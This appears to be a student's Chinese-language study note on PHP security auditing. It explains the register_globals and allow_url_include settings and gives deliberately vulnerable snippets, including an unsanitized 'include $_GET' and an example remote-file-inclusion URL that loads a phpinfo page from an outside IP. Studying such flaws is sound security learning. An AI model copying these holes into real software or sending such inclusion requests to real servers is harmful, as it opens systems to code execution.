## 大三11月php审计

### php核心配置参数

1.register_globals

> 在测试过程中，如果我们在参数开启时会造成各种方式传参的混乱

```php
<?php
//register_globals 全局变量注册 5.45已抛弃

//测试 开启,在变量使用时，我们默认是必须要在代码中赋值或者以特定方式传参。
//但是我们用POST或者GET都能进行参数的直接传递
if (isset($user)) {
    if ($user === 'admin')
    {   //当直接传入的参数被解析：
        echo 'True!';
    }
}
?>
```

2.allow_url_include

在打开状态下，可以直接提交远程文件包含

http://127.0.0.1/Review/config.php?a=http://114.132.124.214:89/phpinfo.php

```php+HTML
//2.allow_url_include = On
    //在5.2之后默认关闭，打开后可直接包含远程文件
    include $_GET['a'];
```

